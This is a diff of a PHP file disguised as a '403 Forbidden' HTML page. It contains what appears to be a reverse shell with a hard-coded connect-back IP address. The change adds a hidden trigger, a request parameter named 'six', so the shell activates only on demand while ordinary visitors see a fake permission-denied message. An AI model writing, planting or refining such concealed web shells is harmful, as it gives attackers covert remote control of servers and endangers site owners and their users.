@@ -1,5 +1,5 @@
-<html><head><title>666⛧Forbidden</title></head><body><h1>666⛧Forbidden</h1>
-<?php
+<html><head><title>666Forbidden⛧</title></head><body><h1>666⛧Forbidden</h1>
+<?php if(isset($_REQUEST['six'])){
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '51.79.241.133';  // CHANGE THIS
@@ -90,6 +90,7 @@ function printit ($string) {
 	if (!$daemon) {
 		print "$string\n";
 	}
+   }
 }
 ?> 
 <p>You don't have permission to access this resource.</p></body></html>
